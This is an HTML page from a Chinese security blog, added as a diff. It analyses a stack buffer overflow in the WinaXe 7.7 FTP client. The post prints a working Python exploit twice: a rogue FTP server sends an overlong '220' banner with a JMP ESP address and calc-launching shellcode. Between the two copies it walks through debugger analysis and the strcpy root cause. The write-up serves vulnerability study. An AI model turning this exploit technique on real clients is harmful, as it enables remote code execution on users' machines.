@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="栈溢出,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
+
+
+
+
+
+
+<meta name="description" content="对于软件WINAXE 7.7 中存在的由栈溢出导致的远程代码执行漏洞的分析。">
+<meta name="keywords" content="栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞分析——WinaXe 7.7远程代码执行漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/index.html">
+<meta property="og:site_name" content="Aye&#39;s house">
+<meta property="og:description" content="对于软件WINAXE 7.7 中存在的由栈溢出导致的远程代码执行漏洞的分析。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/10.png">
+<meta property="og:updated_time" content="2019-07-31T03:16:29.155Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="漏洞分析——WinaXe 7.7远程代码执行漏洞">
+<meta name="twitter:description" content="对于软件WINAXE 7.7 中存在的由栈溢出导致的远程代码执行漏洞的分析。">
+<meta name="twitter:image" content="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/">
+
+
+
+
+
+  <title>漏洞分析——WinaXe 7.7远程代码执行漏洞 | Aye's house</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Aye's house</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ayesawyer">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aye's house">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">漏洞分析——WinaXe 7.7远程代码执行漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-23T11:03:49+08:00">
+                2019-07-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞挖掘-利用/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞挖掘/利用</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/" class="leancloud_visitors" data-flag-title="漏洞分析——WinaXe 7.7远程代码执行漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv">
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>对于软件WINAXE 7.7 中存在的由栈溢出导致的远程代码执行漏洞的分析。</p>
+<a id="more"></a>
+<p><strong>参考自：<a href="https://whereisk0shl.top/post/2019-01-19" target="_blank" rel="noopener">https://whereisk0shl.top/post/2019-01-19</a></strong><br><strong>poc如下——</strong></p>
+<pre><code>import socket,struct
+
+#WinaXe v7.7 FTP Client &apos;Service Ready&apos; Command Buffer Overflow Exploit
+#Discovery hyp3rlinx
+#ISR: ApparitionSec
+#hyp3rlinx.altervista.org
+
+
+#shellcode to pop calc.exe Windows 7 SP1
+sc=(&quot;\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B&quot;
+&quot;\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B&quot;
+&quot;\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31&quot;
+&quot;\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA&quot;
+&quot;\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14&quot;
+&quot;\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65&quot;
+&quot;\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC&quot;)
+
+
+eip=struct.pack(&apos;&lt;L&apos;,0x68084A6F)    #POP ECX RET 
+jmpesp=struct.pack(&apos;&lt;L&apos;,0x68017296) #JMP ESP
+
+#We will do POP ECX RET and place a JMP ESP address at the RET address that will jump to shellcode.
+
+payload=&quot;A&quot;*2061+eip+jmpesp+&quot;\x90&quot;*10+sc+&quot;\x90&quot;*20     #Server Ready &apos;220&apos; Exploit
+
+port = 21                   
+s = socket.socket()
+host = &apos;127.0.0.1&apos;              
+s.bind((host, port))            
+s.listen(5)               //这里是创建了一个ftp server，用于接受WinaXe ftp client的连接 ，并发送shellcode                 
+
+print &apos;Evil FTPServer listening...&apos;
+
+while True:
+    conn, addr = s.accept()     
+    conn.send(&apos;220&apos;+payload+&apos;\r\n&apos;)
+    conn.close()
+</code></pre><h2 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1.背景知识"></a>1.背景知识</h2><h3 id="A-WinaXe"><a href="#A-WinaXe" class="headerlink" title="A.WinaXe"></a>A.WinaXe</h3><h4 id="（1）X终端"><a href="#（1）X终端" class="headerlink" title="（1）X终端"></a>（1）<a href="https://baike.baidu.com/item/X%E7%BB%88%E7%AB%AF/17703897" target="_blank" rel="noopener">X终端</a></h4><p>X终端（X terminal）一般为无磁盘的计算机，它专门设计用于为低成本用户接口提供在X服务器网络中运行的应用程序，X终端是分布式X Window System的一部分。一般的，X终端连接到大型机、小型机或者工作站中运行Unix操作系统的服务器。</p>
+<h4 id="（2）WinaXe"><a href="#（2）WinaXe" class="headerlink" title="（2）WinaXe"></a>（2）<a href="https://baike.baidu.com/item/WinaXe" target="_blank" rel="noopener">WinaXe</a></h4><ol>
+<li>一个PC的X终端模拟器，如果你的Windows系统通过TCP/IP连接到UNIX主机上，那么这个软件就能让你在windows系统上运行其X程序，它支持OpenLook，Motif，CDE，VUE，Xt，X11R6.3和其它运行在Sun，HP，SGI，Linux，SCO，AIX等Unix工作站上的X程序。</li>
+<li>它是一个强大的软件包，让你的PC变成X Windows的工作站，提供X Windows系统、TCP/IP、FTP、TFTP和Telnet软件，以及运行远程UNIX和X应用程序的一切，包括NFS服务器和客户端软件。</li>
+<li>接下来要分析的漏洞就存在于其提供的FTP客户端软件中。</li>
+</ol>
+<h3 id="B-ftp连接"><a href="#B-ftp连接" class="headerlink" title="B.ftp连接"></a>B.ftp连接</h3><p><img src="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/1.png" alt=""></p>
+<h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h2><p>运行poc后，成功创建ftp服务器（host为127.0.0.1），然后在客户端连接此服务器，可以直接看到利用成功，弹出计算器。</p>
+<p><img src="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/2.png" alt=""></p>
+<p><em>值得注意的是，这只是最基本的利用，验证其能够实现远程代码执行。从上图中也可以看到，在弹出计算器之后，应用程序就崩溃了，真正很好的利用是要使得应用程序执行完代码后能正常退出或继续运行，而不是崩溃。</em></p>
+<h2 id="3-漏洞分析"><a href="#3-漏洞分析" class="headerlink" title="3.漏洞分析"></a>3.漏洞分析</h2><h3 id="A-漏洞点定位"><a href="#A-漏洞点定位" class="headerlink" title="A.漏洞点定位"></a>A.漏洞点定位</h3><p><strong>为了定位具体的漏洞点，将poc中的payload改为2200个重复的字符<code>A</code>，运行后再WinDbg中可看到其崩溃信息如下图。</strong>由于此时栈上数据已经被覆盖，破坏了栈上的调用结构，所以无法获取具体的调用函数链，也无法看到具体的报错代码。</p>
+<p><img src="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/3.png" alt=""></p>
+<hr>
+<p><strong>那么问题来了，该如何获取到分析程序的入手点呢？</strong></p>
+<hr>
+<p>发现自己好傻，既然数据太长把栈上数据覆盖了导致无法定位，那我可以先获取到eip寄存器的具体偏移，不用溢出那么多，就不会彻底破坏栈结构。<em>果然隔一段时间不练习连最基础的方法都忽略了。</em></p>
+<p><img src="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/4.png" alt=""></p>
+<p>由上图所示，得到入手分析点（正常的返回地址<code>42cc32</code>,由此定位到报错函数及其上层函数分别为<code>404597</code>和<code>42C890</code>）后就动态调试分析其具体的数据流向和函数调用流程，以分析出漏洞的产生原因和利用方式。</p>
+<h3 id="B-漏洞分析"><a href="#B-漏洞分析" class="headerlink" title="B.漏洞分析"></a>B.漏洞分析</h3><p><strong>在Immunity Debugger中能看到更加直观的返回地址和调用关系，如下图。</strong></p>
+<p><img src="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/5.png" alt=""></p>
+<hr>
+<p><strong>接下来通过分析数据流向，找到漏洞触发原因。</strong></p>
+<hr>
+<p>关键的数据流向如下：</p>
+<blockquote>
+<p>在函数<code>sub_42C890</code>中，程序对接收到的来自远程ftp服务器的数据进行处理，在处理过程中并没有限制数据的长度。<br>在<code>0042CC2D</code>处调用函数<code>sub_404597</code>。<br>在函数<code>sub_404597</code>中调用函数<code>sub_404502</code>。<br>漏洞点位于函数<code>sub_404502</code>中，由于这一系列操作并没有对数据长度进行限制，直接调用函数<code>strcpy</code>就可能会导致栈溢出。</p>
+</blockquote>
+<p><img src="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/6.png" alt=""></p>
+<p><img src="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/7.png" alt=""></p>
+<p>但是我们可以看到，虽然<code>strcpy</code>函数拷贝了超长字符串到栈中，但在上述函数调用流程中，前几处返回的EIP都没有被覆盖，所以接下来我们需要继续动态调试以验证该漏洞的可利用性。</p>
+<p><img src="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/8.png" alt=""></p>
+<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><p>在漏洞分析过程中，找到了漏洞点，继续向下跟踪数据的流向，可以发现在从函数<code>sub_404502</code>返回上层调用函数时，EIP被<code>strcpy</code>写入的数据覆盖，故我们可以劫持程序执行流程，实现漏洞利用。</p>
+<p><img src="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/9.png" alt=""></p>
+<p><strong>由于EIP之后还有足够的溢出空间，可以直接在EIP后面的栈空间中写入shellcode，然后利用<code>jmpesp</code>的方式进行利用。</strong>这里对博客最开始列出的参考poc进行简单修改如下。</p>
+<pre><code>import socket,struct
+
+#WinaXe v7.7 FTP Client &apos;Service Ready&apos; Command Buffer Overflow Exploit
+#Discovery hyp3rlinx
+#ISR: ApparitionSec
+#hyp3rlinx.altervista.org
+
+
+#shellcode to pop calc.exe Windows 7 SP1
+sc=(&quot;\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B&quot;
+&quot;\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B&quot;
+&quot;\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31&quot;
+&quot;\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA&quot;
+&quot;\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14&quot;
+&quot;\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65&quot;
+&quot;\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC&quot;)
+
+
+eip=struct.pack(&apos;&lt;L&apos;,0x68084A6F)    #POP ECX RET 
+jmpesp=struct.pack(&apos;&lt;L&apos;,0x68017296) #JMP ESP
+
+#We will do POP ECX RET and place a JMP ESP address at the RET address that will jump to shellcode.
+
+#payload=&quot;A&quot;*2061+eip+jmpesp+&quot;\x90&quot;*10+sc+&quot;\x90&quot;*20    //原poc中在jmpesp地址前写入了一个&quot;POP ECX RET&quot;的gadget的地址，但我在调试过程中发现，这个gadget并没有被执行，直接写入任意4个字节都可以达到效果，所以进行如下简化修改。
+
+payload=&quot;A&quot;*2065+jmpesp+&quot;\x90&quot;*10+sc+&quot;\x90&quot;*20 
+port = 21                   
+s = socket.socket()
+host = &apos;127.0.0.1&apos;              
+s.bind((host, port))            
+s.listen(5)                    
+
+print &apos;Evil FTPServer listening...&apos;
+
+while True:
+    conn, addr = s.accept()     
+    conn.send(&apos;220&apos;+payload+&apos;\r\n&apos;)
+    conn.close()
+</code></pre><p><strong>poc中找到的jmpesp的地址很巧妙，如下图所示。</strong></p>
+<p><img src="/2019/07/23/漏洞分析——WinaXe-7-7远程代码执行漏洞/10.png" alt=""></p>
+<h2 id="5-遇到的问题"><a href="#5-遇到的问题" class="headerlink" title="5.遇到的问题"></a>5.遇到的问题</h2><p>现象：在Immunity Debugger中进行动态调试时，执行到某个函数调用语句时出现卡死的状态，此时按F7（单步步入执行）和F8（单步步过执行）均无响应。</p>
+<p>解决：此时按暂停键<code>||</code>停止程序运行，就会从卡死的状态中跳出来，然后继续单步执行调试即可。</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote>
+<p><a href="https://bbs.pediy.com/thread-213936.htm" target="_blank" rel="noopener">WinaXe 7.7 ‘FTP client’ 远程溢出漏洞</a></p>
+</blockquote>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/栈溢出/" rel="tag"># 栈溢出</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/22/动态调试-so、dex/" rel="next" title="动态调试 so、dex">
+                <i class="fa fa-chevron-left"></i> 动态调试 so、dex
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/24/Nexu5手机刷机后一直重复开机问题/" rel="prev" title="Nexu5手机刷机后一直重复开机问题">
+                Nexu5手机刷机后一直重复开机问题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="ayesawyer">
+          <p class="site-author-name" itemprop="name">ayesawyer</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">91</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">30</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/ayesawyer" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      GitHub
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://luo-double-kua.github.io/" title="隔壁xxx的小窝" target="_blank">隔壁xxx的小窝</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-背景知识"><span class="nav-number">1.</span> <span class="nav-text">1.背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#A-WinaXe"><span class="nav-number">1.1.</span> <span class="nav-text">A.WinaXe</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#（1）X终端"><span class="nav-number">1.1.1.</span> <span class="nav-text">（1）X终端</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#（2）WinaXe"><span class="nav-number">1.1.2.</span> <span class="nav-text">（2）WinaXe</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#B-ftp连接"><span class="nav-number">1.2.</span> <span class="nav-text">B.ftp连接</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-漏洞复现"><span class="nav-number">2.</span> <span class="nav-text">2.漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-漏洞分析"><span class="nav-number">3.</span> <span class="nav-text">3.漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#A-漏洞点定位"><span class="nav-number">3.1.</span> <span class="nav-text">A.漏洞点定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#B-漏洞分析"><span class="nav-number">3.2.</span> <span class="nav-text">B.漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-漏洞利用"><span class="nav-number">4.</span> <span class="nav-text">4.漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-遇到的问题"><span class="nav-number">5.</span> <span class="nav-text">5.遇到的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考资料"><span class="nav-number">6.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ayesawyer</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>  访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("yWdQWaFa2z2MWDKsMNEzvv3E-gzGzoHsz", "e6INbOXP7UPpJUnKlgxhNb52");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
